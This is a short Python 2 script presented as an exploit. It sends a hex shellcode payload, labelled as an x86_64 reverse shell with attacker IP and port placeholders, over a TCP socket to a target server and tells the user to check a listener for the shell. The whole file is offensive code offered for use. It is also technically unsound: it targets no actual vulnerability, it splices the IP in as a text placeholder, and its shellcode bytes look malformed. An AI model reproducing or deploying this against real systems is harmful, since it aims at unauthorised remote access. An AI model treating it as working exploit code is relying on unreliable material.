import socket
import sys

# Reverse shell payload for Kali Linux 2020 (x86_64)
reverse_shell_payload = (
    "\x48\x31\xf6\x56\x48\xbf"
    "your_ip_address_here"  # Attacker's IP address (replace this)
    "\x57\x54\x5f\x6a\x66\x58\x6a\x01\x5e"
    "\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48"
    "\x97\x6a\x02\x66\xc7\x44\x24\x02"
    "your_port_number_here"  # Attacker's port number (replace this)
    "\x54\x5e\x48\x31\xc0\x0f\x05\x48"
    "\x31\xff\x40\x80\xc7\x01\x48\x89"
    "\xc2\x52\x57\x48\x89\xe6\x0f\x05"
)

def exploit(server_ip, server_port, attacker_ip, attacker_port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to the server
        s.connect((server_ip, server_port))
        
        # Send the reverse shell payload to the server
        print "[*] Sending reverse shell payload to server..."
        s.send(reverse_shell_payload.replace("your_ip_address_here", attacker_ip).replace("your_port_number_here", chr(attacker_port & 0xFF) + chr((attacker_port >> 8) & 0xFF)))
        
        print "[+] Payload sent successfully! Check your listener for the shell."

    except Exception as e:
        print "[-] An error occurred:", e
    
    finally:
        # Close the socket connection
        s.close()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print "Usage: python exploit.py <server_ip> <server_port> <attacker_ip> <attacker_port>"
        sys.exit(1)
    
    server_ip = sys.argv[1]
    server_port = int(sys.argv[2])
    attacker_ip = sys.argv[3]
    attacker_port = int(sys.argv[4])
    exploit(server_ip, server_port, attacker_ip, attacker_port)
